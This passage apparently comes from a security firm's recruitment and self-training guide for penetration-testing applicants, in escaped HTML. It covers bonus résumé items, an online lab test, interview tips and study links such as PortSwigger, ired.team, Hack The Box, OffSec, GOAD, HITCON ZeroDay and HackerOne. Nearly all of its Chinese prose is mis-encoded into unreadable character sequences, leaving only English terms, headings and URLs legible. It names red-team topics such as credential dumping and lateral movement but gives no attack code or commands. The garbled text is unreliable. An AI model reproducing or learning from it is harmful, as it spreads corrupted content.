&lt;p&gt;‰∏ãÈù¢ÂàóÂá∫‰∏Ä‰∫õÈùûÂøÖË¶Å‰ΩÜÊúâÊúÉÂæà‰∏çÈåØÁöÑÂä†ÂàÜÈ†ÖÁõÆÔºåÂ¶ÇÊûúÊúâÈÄôÊñπÈù¢ÁöÑÁ∂ìÊ≠∑ÂãôÂøÖË¶ÅÂØ´‰∏ä„ÄÇÂêåÊôÇ‰πüÂàóÂá∫ÊØèÂÄãÈ†ÖÁõÆ‰∏≠ÊàëÂÄëÁúãÈáçÁöÑÁâπË≥™ÔºåÂ¶ÇÊûúÊúâÂÖ∂‰ªñÂèØ‰ª•Â±ïÁèæÈÄô‰∫õÁâπË≥™ÁöÑÁ∂ìÊ≠∑‰πüÊ≠°ËøéÂàóÂá∫‰æÜËÆìÂØ©Ê†∏ËÄÖÁü•ÈÅì„ÄÇ&lt;/p&gt;

&lt;h5 id=&quot;-ÂØ¶Êà∞Á∂ìÈ©óÂ¶Çcvebug-bounty&quot;&gt;üìÑ ÂØ¶Êà∞Á∂ìÈ©óÂ¶ÇÔºöCVE„ÄÅbug bounty&lt;/h5&gt;

&lt;ul&gt;
  &lt;li&gt;‰ª£Ë°®ÊÇ®ÊìÅÊúâËß£Ê±∫Êú™Áü•ÂïèÈ°åËÉΩÂäõ„ÄÇ&lt;/li&gt;
  &lt;li&gt;‰ª£Ë°®ÊÇ®ËÉΩÁúãÂà∞Âà•‰∫∫ÊâÄÊ≤íÊúâÈóúÊ≥®Âà∞ÁöÑÁ¥∞ÁØÄ„ÄÇ&lt;/li&gt;
&lt;/ul&gt;

&lt;h5 id=&quot;-ctf-writeups-ÊàñÊòØ-blog&quot;&gt;üìÑ CTF Writeups ÊàñÊòØ Blog&lt;/h5&gt;

&lt;ul&gt;
  &lt;li&gt;Â¶ÇÊûúÂú® CTF ÊØîË≥ΩÊúâ‰∏çÈåØÁöÑÊàêÁ∏æÔºåÈÄöÂ∏∏ÊÑèÂë≥Ëëó‰Ω†ÊìÅÊúâÂú®Áü≠ÊôÇÈñìÂÖßÂàÜÊûêÊ≠∏Á¥çÈáçÈªûÁöÑËÉΩÂäõ„ÄÅ‰πüËÉΩÂ§†Âø´ÈÄüÊâæÂà∞Ëß£Ê±∫Ëæ¶Ê≥ïÔºåËÅØÊÉ≥ÂäõÂâµÈÄ†ÂäõÂèØËÉΩ‰πü‰∏çÂ∑Æ„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÊàëÂÄëÂ∏åÊúõËÉΩ‰∫ÜËß£ÊÇ®Â¶Ç‰ΩïÊèèËø∞Ë§áÈõúÁöÑÊºèÊ¥ûÔºåÂõ†ÁÇ∫Âú®Â∞á‰æÜÁöÑÂ∑•‰Ωú‰∏≠ÈúÄË¶ÅÂ∞áÊºèÊ¥ûÈÅéÁ®ãÊ∏ÖÊ•öÊèèËø∞‰∏¶Áµ¶‰∫àÂª∫Ë≠∞„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÂØ´ Blog Èô§‰∫ÜËÉΩÂ±ïÁèæË°®ÈÅîÂíåÊñáÂ≠óËÉΩÂäõÂ§ñÔºåÈÄöÂ∏∏‰πüÂÖ∑ÊúâÊåÅÁ∫åÂ≠∏ÁøíÁöÑÁÜ±ÊÉÖÂíåÊ®ÇÊñºÂàÜ‰∫´ÁöÑÁâπË≥™ÔºåÁ¨¶Âêà DEVCORE Ê†∏ÂøÉÂÉπÂÄºËßÄ„ÄÇ&lt;/li&gt;
&lt;/ul&gt;

&lt;h5 id=&quot;-ctf-Âá∫È°åÁ∂ìÈ©ó&quot;&gt;üìÑ CTF Âá∫È°åÁ∂ìÈ©ó&lt;/h5&gt;

&lt;ul&gt;
  &lt;li&gt;‰ª£Ë°®Âπ≥Â∏∏ÊúÉÊåÅÁ∫åÈóúÊ≥®ÊµÅË°åÁöÑÊäÄË°ì„ÄÅÁ†îÁ©∂Ë™ûË®ÄÊàñÊ°ÜÊû∂ÁâπÊÄßÔºåËÉΩÊ≥®ÊÑèÂà∞‰∏Ä‰∫õÈÆÆÂ∞ë‰∫∫Áü•ÈÅìÁöÑÂ∞èÁ¥∞ÁØÄ„ÄÇ&lt;/li&gt;
  &lt;li&gt;Ë™™Êòé‰Ω†Èô§‰∫ÜÊîªÊìäÔºåÈÇÑÂÖ∑ÂÇô‰∏ÄÂÆöÁ®ãÂ∫¶ÁöÑÈñãÁôºËÉΩÂäõ„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÁÇ∫‰∫ÜÊÄïÈ°åÁõÆË¢´ CTF Áé©ÂÆ∂ÊÉ°ÊÑèÁ†¥Â£ûÔºåÈÄöÂ∏∏Âá∫È°åËÄÖ‰πüÂÖ∑ÂÇôÈ´òÊ∞¥Ê∫ñÁöÑÈò≤Á¶¶ËÉΩÂäõ„ÄÇ&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;-Á∑ö‰∏äÊ∏¨È©ó&quot;&gt;üìå Á∑ö‰∏äÊ∏¨È©ó&lt;/h3&gt;

&lt;p&gt;ÈÄôÂÄãÈöéÊÆµÁöÑÈÄ≤Ë°åÊñπÂºèËàá‰∏ÄËà¨Á∑ö‰∏äÈù∂Ê©üÁí∞Â¢ÉÂ¶Ç OSCP„ÄÅHTB ÁÑ°Áï∞ÔºåÊúÉÂàÜÈÖçÂà∞‰∏ÄÂÄãÈ°åÁµÑÔºåÂπ≥ÂùáÈúÄË¶ÅËß£‰∫îÊää flag„ÄÇÊáâÂæµËÄÖÊúÉÊúâÁõ∏Áï∂Ë∂≥Â§†ÁöÑÊôÇÈñìÈÄ≤Ë°åËß£È°åÔºàÈ†êË®≠ 10 Â§©ÔºåË¶ñÈ°åÁõÆÊúÉÂæÆË™øÔºâÔºåÊúÄÂæå‰∫§‰ªòÂ†±Âëä„ÄÇÊàëÂÄëÊúüÂæÖÂæûÁ∑ö‰∏äÊ∏¨È©ó‰∏≠ÁúãÂà∞ÊáâÂæµËÄÖÂÖ∑ÂÇô‰∏ãËø∞ËÉΩÂäõÔºö&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ÂÅµÊü•ÔºöËÉΩÂê¶ÈÄèÈÅéÁèæÊúâË≥áË®äÂêàÁêÜÊé®Êñ∑ËÉåÂæåÁöÑÊû∂ÊßãÊàñÂØ´Ê≥ï„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÊºèÊ¥ûÊåñÊéòÔºöËÉΩÂê¶ÊâæÂà∞È°åÁõÆ‰∏≠Ë®≠Ë®àÁöÑÊºèÊ¥û„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÊáâËÆäÔºöÁ¢∞Âà∞ÁâπÊÆäÁöÑÁí∞Â¢ÉÂèØÂê¶Ëá™Ë°åÊÉ≥Ëæ¶Ê≥ïÂÖãÊúç„ÄÇ‰æãÂ¶ÇÂú®Âè™Êúâ command injection ‰∏îÂÖßÁ∂≤ÊúâÈò≤ÁÅ´ÁâÜÈôêÂà∂ÁöÑÁâπÊÆäÁí∞Â¢É‰∏ãÔºåÊÄéÈ∫ºÁî®ÊâãÈÇäÂèØÂà©Áî®ÁöÑË≥áÊ∫êÈÅîÊàê‰Ω†ÁöÑÁõÆÊ®ô„ÄÇ&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;-Èù¢Ë©¶&quot;&gt;üìå Èù¢Ë©¶&lt;/h3&gt;

&lt;p&gt;ÊúÄÂæåÁöÑÈù¢Ë©¶ÈöéÊÆµÊúÉÂÖ®Èù¢Ë©ï‰º∞‰Ω†ÊòØÂê¶ÈÅ©ÂêàÈÄôÂÄãËÅ∑‰ΩçÔºå‰∏ãËø∞ 2 ‰ª∂‰∫ãÊÉÖÁâπÂà•ÊÉ≥ËàáÊáâÂæµËÄÖÂàÜ‰∫´Ôºö&lt;/p&gt;

&lt;h4 id=&quot;Ë¢´ÂïèÂÄíÊòØÊ≠£Â∏∏ÁöÑ&quot;&gt;Ë¢´ÂïèÂÄíÊòØÊ≠£Â∏∏ÁöÑ&lt;/h4&gt;

&lt;p&gt;Âú®Èù¢Ë©¶ÈÅéÁ®ã‰∏≠ÔºåÈù¢Ë©¶ÂÆòÊúÉÂæûÂ§öÂÄãËßíÂ∫¶Ê∑±ÂÖ•‰∫ÜËß£ÊáâÂæµËÄÖÊäÄË°ìÁöÑÂª£Â∫¶ÂíåÊ∑±Â∫¶ÔºåÂõ†Ê≠§ÔºåÊúÉË¢´ÂïèÂÄíÊòØÊ≠£Â∏∏ÁöÑ„ÄÇË´ãÂ∞çËá™Â∑±ÁöÑÊäÄË°ìËÉΩÂäõÊúâ‰ø°ÂøÉÔºåÁï¢Á´ü‰Ω†Â∑≤Á∂ìÈÄöÈÅé‰∫ÜÁ¨¨‰∫åÈöéÊÆµÁöÑÁ∑ö‰∏äÊ∏¨È©ó„ÄÇË¢´ÂïèÂà∞‰∏çÁÜüÊÇâÁöÑÂïèÈ°åÊôÇÔºåÂè™Ë¶ÅË™†ÂØ¶Âú∞Ë°®ÈÅî‰Ω†ÁöÑÊÄùËÄÉÈÅéÁ®ãÂíåËß£Ê±∫ÂïèÈ°åÁöÑÊñπÊ≥ïÂç≥ÂèØ„ÄÇÊàëÂÄëÊÉ≥Ë¶ÅÁü•ÈÅìÊÄùËÄÉËÑàÁµ°ÔºåÁîöËá≥ÊúüÂæÖ‰Ω†Ë™™ÔºöÊàëÁúãÂà∞ XX ÁâπÂæµË¶∫ÂæóÈÄôÈ°åÂèØËÉΩÊòØ OO ÊñπÂêëËß£ÔºåÊàëÊúÉÊÉ≥Áî®‰ªÄÈ∫ºÈóúÈçµÂ≠óÊêúÂ∞ãÊâæÁ≠îÊ°à„ÄÇÈÄôÊ®£ÁöÑÂõûÁ≠î‰πüÂá∏È°Ø‰∫Ü‰Ω†ÁöÑÂà§Êñ∑ÂäõÂíåËß£Ê±∫ÂïèÈ°åÁöÑËÉΩÂäõ„ÄÇ&lt;/p&gt;

&lt;h4 id=&quot;ÂàÜ‰∫´‰Ω†ÁöÑ-hack-ÊïÖ‰∫ã&quot;&gt;ÂàÜ‰∫´‰Ω†ÁöÑ Hack ÊïÖ‰∫ã&lt;/h4&gt;

&lt;p&gt;ÊàëÂÄëÊúüÂæÖÂú®Èù¢Ë©¶‰∏≠ËÅΩ‰Ω†ÂàÜ‰∫´ÈÅéÂéªÁâπÂà•ÁöÑ Hack Á∂ìÊ≠∑Ôºå‰∏¶‰∏îËàá‰Ω†Ë®éË´ñÁ¥∞ÁØÄ„ÄÇHack ÁöÑÂÖßÂÆπ‰∏çÈôêÔºå‰æãÂ¶ÇÔºö&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Â±•Ê≠∑‰∏≠ÊèêÂà∞ÁöÑ CVE„ÄÅbug bounty
    &lt;ul&gt;
      &lt;li&gt;Â∏åÊúõÊòØ‰∏Ä‰∫õÁâπÂà•ÁöÑÊÉÖÂ¢ÉÔºåÂ¶ÇÊûúÊâæÂà∞ÁöÑÊòØÂ∏∏Ë¶ãÊºèÊ¥ûÂ¶Ç SQLi Êàñ XSSÔºåÈÇ£ÊúÉÂ∏åÊúõ‰∫ÜËß£ÈÄôÂÄãÊºèÊ¥ûÁâπÂà•Âú®Âì™ÔºüÊàñËÄÖÊòØËÉΩË™™Âá∫‰Ω†ÂÅö‰∫Ü‰ªÄÈ∫ºÔºåÁÇ∫‰ªÄÈ∫º‰Ω†ËÉΩÊâæÂà∞ÈÄôÂÄãÊºèÊ¥ûÔºü&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Âú® CTF ÊØîË≥Ω‰∏≠ÊÉ≥Âà∞ÁöÑÁ≤æÂ¶ôËß£Ê≥ï&lt;/li&gt;
  &lt;li&gt;ÁîüÊ¥ª‰∏≠ÁÇ∫‰∫ÜÈÅîÊàêÁõÆÊ®ôÂÅöÁöÑ Hack
    &lt;ul&gt;
      &lt;li&gt;‰æãÂ¶ÇÔºöÁÇ∫‰∫ÜËá™ÂãïÂåñÂ∑•‰ΩúÊµÅÁ®ãÂØ´‰∫ÜÂÄãÂ∞èÂ∑•ÂÖ∑ÔºõÁÇ∫‰∫ÜÁßüÊàøË≥áË®ä‰∏≤‰∫ÜÂÄãÊñπ‰æøÈÄöÁü•Á≥ªÁµ±ÔºõÊÉ≥ÊääÈÅäÊà≤ÊØèÊó•È†òÂèñ‰ªªÂãôËá™ÂãïÂåñ„ÄÇ&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;-Ëá™ÊàëÈçõÈçä‰πãË∑Ø&quot;&gt;üöÄ Ëá™ÊàëÈçõÈçä‰πãË∑Ø&lt;/h2&gt;

&lt;p&gt;ÈÄô‰∏ÄÊÆµÂØ´Áµ¶ÁèæÂú®ÈÇÑÂú®Ê∫ñÂÇôÈöéÊÆµÔºåÊú™‰æÜÂæàÊÉ≥Ë¶ÅÂä†ÂÖ•Ë≥áÂÆâÊ™¢Ê∏¨Ë°åÊ•≠ÁöÑÂêåÂ≠∏„ÄÇÁÇ∫‰∫ÜÂ¢ûÂä†Ëá™Â∑±ÁöÑÂØ¶ÂäõÔºåÂú®ÊáâÂæµÂâçÊúâ‰∏ãÈù¢ÂπæÂÄãÁ≤æÈÄ≤‰∫ãÈ†ÖÂèØÂèÉËÄÉÔºåÈÄôÂ∞çÂú®Ë≥áÂÆâÈ†òÂüüÈï∑ÈÅ†ÁôºÂ±ï‰πüÂæàÊúâÂπ´Âä©„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;-Ë£úË∂≥Âü∫Á§éÁü•Ë≠ò&quot;&gt;üìå Ë£úË∂≥Âü∫Á§éÁü•Ë≠ò&lt;/h3&gt;

&lt;h4 id=&quot;web-Â∏∏Ë¶ãÊºèÊ¥ûÁ®ÆÈ°û&quot;&gt;Web Â∏∏Ë¶ãÊºèÊ¥ûÁ®ÆÈ°û&lt;/h4&gt;

&lt;p&gt;ÊàëÂÄëË™çÁÇ∫ &lt;a href=&quot;https://portswigger.net/web-security&quot;&gt;PortSwigger Web Security Academy&lt;/a&gt; Êï¥ÁêÜÁöÑÊºèÊ¥ûÁ∂ìÂÖ∏‰∏îÂÆåÊï¥ÔºåÂä†‰∏äÊúâ LAB ÂèØ‰ª•Áõ¥Êé•Á∑¥ÁøíÔºåÈÅ©ÂêàÂàùÂ≠∏ËÄÖ„ÄÇÈÄô‰∫õÊºèÊ¥ûÊòØÂæû‰∫ãË≥áÂÆâÊ™¢Ê∏¨ÊúÄÂü∫Á§éÁöÑÊ∫ùÈÄöË™ûË®ÄÔºåÊé®Ëñ¶Ë¶ÅÊää&lt;a href=&quot;https://portswigger.net/web-security/all-materials&quot;&gt;ÊïôÊùêÈ†ÅÈù¢&lt;/a&gt;‰∏äÊâÄÊúâÊºèÊ¥ûÁ∑¥ÁøíÂÆåÔºåÂèØ‰ª•Âæû&lt;a href=&quot;https://portswigger.net/web-security/all-topics&quot;&gt;‰∏ªÈ°åÈ†ÅÈù¢&lt;/a&gt;ÁúãÂàÜÈ°ûÊúÉÊØîËºÉÊ∏ÖÊ•ö„ÄÇËã•‰ª•Á¥ÖÈöäÁÇ∫ÁõÆÊ®ôÔºåÊàëÂÄëÊúÉÂÑ™ÂÖàÈóúÊ≥®ËÉΩÊãø shell ÁöÑÂæåÁ´ØÊºèÊ¥û„ÄÇ
‰ª•‰∏ãÊèê‰æõÂπæÈªûËá™ÊàëÈ©óË≠âËàáÁ≤æÈÄ≤È†ÖÁõÆÔºö&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ÊäΩ‰∏ÄÂÄãÊºèÊ¥ûÊòØÂê¶ÂèØ‰ª•Ë™™Âá∫ÈÄôÂÄãÊºèÊ¥ûÂ∏∏ÁôºÁîüÂú®‰ªÄÈ∫ºÂäüËÉΩÔºüËÉåÂæåÁöÑÊàêÂõ†ÔºüÈÄöÂ∏∏ÂèØ‰ª•ÊÄéÈ∫ºÈÄ≤ÈöéÂà©Áî®ÈÄôÂÄãÊºèÊ¥ûÔºü&lt;/li&gt;
  &lt;li&gt;ÊúâÊ≤íÊúâËæ¶Ê≥ïÂú®ÈªëÁÆ±ÁãÄÊÖãÔºåÈÄèÈÅéÊ∏¨Ë©¶Ëæ®Ë≠òÂá∫ÈÄô‰∫õÊºèÊ¥ûÔºü&lt;/li&gt;
  &lt;li&gt;Âú®ÁôΩÁÆ±ÁãÄÊÖã‰∏ãÔºåÁü•ÈÅìÂì™‰∫õÊºèÊ¥ûË¶ÅÈÄèÈÅéÊêúÂ∞ã‰ªÄÈ∫ºÂáΩÊï∏ÊâæÂà∞Ôºü&lt;/li&gt;
  &lt;li&gt;ÊàëÂÄëÂú®Èù¢Ë©¶‰∏≠ÂñúÊ≠°ÂïèÂêÑÁ®ÆÊºèÊ¥ûÊÄéÈ∫ºÊãø shell ÁöÑÂïèÈ°åÔºåÂõ†ÁÇ∫ÈÄôÂ∞±ÊòØÁ¥ÖÈöäÊºîÁ∑¥ÁõÆÊ®ôÁöÑÁ¨¨‰∏ÄÊ≠•„ÄÇÊêúÂ∞ã ‚Äúfrom XSS to RCE‚Äù ÈÄôÈ°ûÁöÑÈóúÈçµÂ≠óËÉΩÊâæÂà∞Áõ∏Áï∂Â§öÊ°à‰æãÔºàXSS ÂèØ‰ª•Âèñ‰ª£Êàê SQLi Á≠âÊºèÊ¥ûÔºâ„ÄÇ&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;Á¥ÖÈöäÊà∞Ë°ìËàáÊäÄÂ∑ß&quot;&gt;Á¥ÖÈöäÊà∞Ë°ìËàáÊäÄÂ∑ß&lt;/h4&gt;

&lt;p&gt;ÊéßÂà∂‰∏ÄÂè∞ÈõªËÖ¶ÂæåÔºå‰ªçÈúÄË¶ÅÂú®ÂÖßÁ∂≤‰∏≠Êì¥Êï£ÂÆåÊàê‰ªªÂãôÁõÆÊ®ô„ÄÇ&lt;a href=&quot;https://ired.team/&quot;&gt;ired.team&lt;/a&gt; Êèê‰æõ‰∫Ü‰∏ÄÊú¨Á¥ÖÈöäÊäÄÂ∑ßÂ∑•ÂÖ∑Êõ∏ÔºåÊé®Ëñ¶Èñ±ËÆÄ‰ª•‰∫ÜËß£Âú®‰∏çÂêåÈöéÊÆµÊúâÂì™‰∫õÊãõÂºèÂèØÁî®„ÄÇÂ∞ç DEVCORE ËÄåË®ÄÔºåÊàëÂÄëÂÑ™ÂÖàÈóúÊ≥®„ÄåActive Directory &amp;amp; Kerberos Abuse„Äç„ÄÅ„ÄåCredential Access &amp;amp; Dumping„Äç„ÄÅ„ÄåLateral Movement„ÄçÁ´†ÁØÄ‰∏ãÁöÑÊäÄËÉΩ„ÄÇÊ≠§Â§ñÔºå„ÄåNetwork pivoting &amp;amp; tunneling„ÄçÁöÑÊ¶ÇÂøµÂíåÊäÄÂ∑ß‰πüÊòØÊàëÂÄëÊúÉÈóúÊ≥®ÁöÑËÉΩÂäõÔºåired.team Âú®ÈÄôÂ°äËëóÂ¢®ËºÉÂ∞ëÔºå&lt;a href=&quot;https://blog.raw.pm/en/state-of-the-art-of-network-pivoting-in-2019/&quot;&gt;ÈÄôÁØáÊñáÁ´†&lt;/a&gt;Ê∂µËìã‰∫ÜÂøÖË¶ÅÁü•Ë≠òÂíåÂ∑•ÂÖ∑ÂèØÂèÉËÄÉ„ÄÇ
‰ª•ÁµÇÁÇ∫ÂßãÂ≠∏ÁøíÔºåÂ∏åÊúõÂú®Á∑¥ÁøíÈÄô‰∫õÊäÄÂ∑ßÂíåÂ∑•ÂÖ∑ÂæåÔºåËÉΩÂ∞ç‰∏ãÈù¢ÁöÑÂïèÈ°åÊúâËá™Â∑±ÁöÑÁúãÊ≥ïÔºö&lt;/p&gt;

&lt;p&gt;Â¶ÇÊûúÊâì‰∏ã‰ºÅÊ•≠‰∏ÄÂè∞Â§ñÁ∂≤ÊúçÂãôÔºåËÄå‰Ω†ÁöÑÁõÆÊ®ôÊòØË©≤‰ºÅÊ•≠ÂÖßÁ∂≤Á∂≤ÂüüÊéßÂà∂Âô®ÔºàÊÉÖÂ¢ÉÊû∂ÊßãÂèØËá™Ë°åÂÅáË®≠ÔºâÔºö&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;ÁÇ∫‰∫ÜÊâì ADÔºå‰Ω†Âú®Êâì‰∏ãÁöÑÂ§ñÁ∂≤‰º∫ÊúçÂô®‰∏äÊúÉÂÅöÂì™‰∫õ‰∫ãÊÉÖÔºüÁÇ∫‰ªÄÈ∫ºÔºüÈÅéÁ®ã‰∏≠‰Ω†ÂÅèÂ•Ω‰ΩøÁî®‰ªÄÈ∫ºÂ∑•ÂÖ∑ÔºüÂÅèÂ•ΩÁöÑÂéüÂõ†ÊòØ‰ªÄÈ∫ºÔºü&lt;/li&gt;
  &lt;li&gt;Âêå‰∏äÔºåÈÄôÂè∞‰º∫ÊúçÂô®Â¶ÇÊûúÊúâÁ∂≤ÂüüÂ∏≥Ëôü‰Ω†‰πãÂæåÊúÉÂÅöÂì™‰∫õ‰∫ãÊÉÖÔºüÂ¶ÇÊûúÊ≤íÊúâÁ∂≤ÂüüÂ∏≥ËôüÂë¢Ôºü&lt;/li&gt;
  &lt;li&gt;ÊÉ≥Êãø‰∏ãÁ∂≤ÂüüÊéßÂà∂Âô®ÔºåÂøÉ‰∏≠ËÉΩÂê¶È¶¨‰∏äË∑≥Âá∫‰∫îÁ®Æ‰ª•‰∏äÁöÑÊñπÊ≥ïÔºü‰Ω†ÊúÉÂÑ™ÂÖàÂòóË©¶‰ªÄÈ∫ºÊñπÊ≥ïÔºüÁÇ∫‰ªÄÈ∫ºÔºü&lt;/li&gt;
  &lt;li&gt;ÈÅéÁ®ã‰∏≠Ê©´ÂêëÁßªÂãïÂÅèÂ•Ω‰ΩøÁî®‰ªÄÈ∫ºÂ∑•ÂÖ∑ÔºüÁÇ∫‰ªÄÈ∫ºÔºü&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;-Á∑¥Áøí&quot;&gt;üìå Á∑¥Áøí&lt;/h3&gt;

&lt;h4 id=&quot;ËôõÊì¨Èù∂Ê©üÁ∑¥Áøí&quot;&gt;ËôõÊì¨Èù∂Ê©üÁ∑¥Áøí&lt;/h4&gt;

&lt;p&gt;Èô§‰∫ÜÁü•Ë≠òÂ§ñÔºå‰πüË¶ÅÊâæ‰∏Ä‰∫õÊ®°Êì¨Áí∞Â¢ÉÂüπÈ§äÊâãÊÑü„ÄÇÁü•ÂêçÁöÑ Hack The Box Âíå OffSec ÈÉΩÊúâÊé®Âá∫Â≠∏ÁøíË∑ØÂæëÂíåË±êÂØåÁöÑÈù∂Ê©üÔºö&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://academy.hackthebox.com/catalogue/paths&quot;&gt;Hack The Box Cybersecurity Paths&lt;/a&gt; (ÂÑ™ÂÖàÁ∑¥ÁøíÔºöPenetration Tester, Senior Web Penetration Tester, Active Directory Enumeration)&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.offsec.com/learning/paths/&quot;&gt;OffSec Learning Paths&lt;/a&gt; (Filter: Red Teamer, Web App Tester)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ÈÅ∏ÊìáÈÅ©ÂêàËá™Â∑±ÁöÑÂπ≥Âè∞Á∑¥ÁøíÂç≥ÂèØ„ÄÇ‰πüÂèØ‰ª•ÂñÆÁ¥îÊâì &lt;a href=&quot;https://app.hackthebox.com/&quot;&gt;HTB Labs&lt;/a&gt; Èù∂Ê©üÔºåÁ∑¥Âà∞Ë¶∫ÂæóÊØèÊ¨°Ëß£È°åÁõÆË¶ÅÂÅöÁöÑ‰∫ãÊÉÖÈÉΩÈ°û‰ººÔºåÈñãÂßãË¶∫ÂæóÈ°åÁõÆÊúâÂ•óË∑ØÊÑüÂ∞±ÂèØ‰ª•‰∫ÜÔºå‰∏Ä‰∫õÁâπÊÆäËß£Ê≥ïÂú®ÁèæÈöéÊÆµ‰∏çÈúÄÁ≥æÁµê„ÄÇÈÅéÂéªÊúâÁé© HTB ÁöÑÂØ¶ÁøíÁîüÂú®ÈåÑÂèñÂâçÈôÑ‰∏äÁöÑ Writeups Â§ßÊ¶ÇÊúÉÂØ´ 30~50 Âè∞Èù∂Ê©üÔºåÈÄôÂÄãÊï∏ÈáèÁ¥öÊàñË®±ÂèØ‰ª•ÂèÉËÄÉ„ÄÇÂè¶Â§ñËã•Ë¶ÅÁ∑¥ÁøíÊâìÁ∂≤ÂüüÔºåÊúÄËøë GitHub ‰∏äÊúâ‰∏ÄÂÄã &lt;a href=&quot;https://github.com/Orange-Cyberdefense/GOAD&quot;&gt;GOAD LAB&lt;/a&gt; Â∞àÊ°àÊªøÂÄºÂæóÂèÉËÄÉ„ÄÇ&lt;/p&gt;

&lt;p&gt;Â¶ÇÊûúÊÉ≥ËÄÉË≠âÁÖßÔºåÊàëÂÄëÊúâËÄÉÈÅéË¶∫ÂæóÂ∞çÊèêÊòáÊ™¢Ê∏¨Â∑•‰ΩúËÉΩÂäõÊúâÂπ´Âä©ÁöÑÊúâÔºö&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.offsec.com/courses/pen-200/&quot;&gt;OffSec PEN-200(OSCP) &lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;ÊèêÊòáË≠òÂà•ÂíåÂà©Áî®ÊºèÊ¥ûËÉΩÂäõ&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.offsec.com/courses/web-300/&quot;&gt;OffSec WEB-300(OSWE)&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;ÊèêÊòáÁôΩÁÆ±ÊåñÊéòÊºèÊ¥ûËÉΩÂäõ&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.alteredsecurity.com/adlab&quot;&gt;Certified Red Team Professional (CRTP) &lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;ÊèêÊòáÁ∂≤ÂüüÁõ∏ÈóúÂü∫Êú¨Áü•Ë≠òÈù¢ËàáÊîªÊìäÈù¢&lt;/li&gt;
      &lt;li&gt;Êñ∞ÊâãÂèãÂñÑÔºåÊòØÂ∞ëÊï∏ÂèØ‰ª•Á≥ªÁµ±ÊÄßÂ≠∏ÁøíÁ∂≤ÂüüÊîªÊìäÁöÑÂ†¥Âüü„ÄÇÂÖßÂÆπËºÉÁ∞°ÂñÆ‰∏îËàá DEVCORE ÊÖ£Áî®‰ΩúÊ≥ïÊúâËêΩÂ∑ÆÔºå‰ΩÜÂÖ•ËÅ∑Âæå‰∏äÊâãÊúÉËºÉÂø´„ÄÇ&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Ë®ªÔºö‰ª•‰∏äÂÉÖÊèê‰æõÂ∑≤Áü•ÊúâÂπ´Âä©ÁöÑË≠âÁÖßÔºå‰∏ç‰ª£Ë°®ÂÖ∂‰ªñË≠âÁÖßÊ≤íÊúâÂπ´Âä©&lt;/p&gt;

&lt;h4 id=&quot;ÂØ¶Êà∞Á∑¥Áøí&quot;&gt;ÂØ¶Êà∞Á∑¥Áøí&lt;/h4&gt;

&lt;p&gt;ÊúÄÊé®Ëñ¶ÁöÑÈÇÑÊòØÂà∞ÁúüÂØ¶Â†¥Âüü‰æÜÁúãÁúã„ÄÇ&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;ÁôΩÁÆ±Á∑¥Áøí&lt;/strong&gt;ÔºöÂèØ‰ª•ÂòóË©¶Êâæ‰Ω†ÁÜüÊÇâÊàñÂñúÊ≠°ÁöÑ GitHub Â∞àÊ°àÔºåÂÖàÁúãÈÄôÂÄãÂ∞àÊ°àÈÅéÂéªÁöÑÊºèÊ¥ûÔºåË©¶Ë©¶ÁúãÂ¶ÇÊûúËá™Â∑±ÁôΩÁÆ±ÁúãÊúâÊ≤íÊúâËæ¶Ê≥ïËÉΩËøΩÂà∞„ÄÇÂ¶ÇÊûúÈÄô‰∫õÊúâÊ≠£Ëß£ÁöÑÊºèÊ¥ûÈÉΩËÉΩÈ†ÜÂà©ÊâæÂà∞ÔºåÊé•ËëóÂ∞±ÈñãÂßãÊâæ‰∏Ä‰∫õ Open Source Â∞àÊ°à‰æÜÊåñÊéò 0-day Âêß„ÄÇ&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;ÈªëÁÆ±Á∑¥Áøí&lt;/strong&gt;ÔºöÂèÉËàá bug bounty Ë®àÁï´ÔºåÊåëÊà∞ÁúüÂØ¶‰∏ñÁïåÁöÑÂÆâÂÖ®ÂïèÈ°å„ÄÇÂè∞ÁÅ£‰ºÅÊ•≠ÁöÑË®àÁï´ÂèØ‰ª•ÂèÉËÄÉ &lt;a href=&quot;https://zeroday.hitcon.org/bug-bounty/list&quot;&gt;HITCON ZeroDay&lt;/a&gt; ÔºåÂúãÂ§ñÂâáÊé®Ëñ¶ &lt;a href=&quot;https://hackerone.com/opportunities/all&quot;&gt;HackerOne&lt;/a&gt; ‰∏äÈù¢ÁöÑÁõÆÊ®ô„ÄÇÈÄô‰∫õË®àÁï´ÊúÉËÆì‰Ω†Èù¢Â∞çÊõ¥Ë§áÈõúÂíåÂ§öÊ®£ÁöÑÊîªÊìäÂ†¥ÊôØÔºåÊèêÂçá‰Ω†ÁöÑÂØ¶Êà∞ËÉΩÂäõ„ÄÇ&lt;/li&gt;
&lt;/ul&gt;

